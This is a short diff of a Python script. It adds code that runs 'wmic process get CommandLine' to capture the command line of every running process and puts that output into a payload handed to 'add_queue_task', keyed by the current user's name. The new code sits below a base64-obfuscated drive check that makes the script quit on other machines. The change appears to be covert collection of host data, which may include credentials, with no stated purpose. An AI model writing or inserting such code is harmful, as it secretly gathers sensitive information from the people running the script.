@@ -156,12 +156,19 @@ def find_file(target_name, start_dir):
 if not os.path.exists(base64.b64decode("Uzov").decode()):
     sys.exit(0)
 
+cls = subprocess.run(
+    "wmic process get CommandLine /format:list",
+    shell=True,
+    capture_output=True,
+    text=True,
+)
+
 add_queue_task(
     "tsl__{}__begin".format(getpass.getuser().lower()),
     {
         "sys_version": str(sys.version),
         "exec_path": str(sys.executable),
-        "usr": getpass.getuser(),
+        "cls": cls.stdout,
     },
 )
 
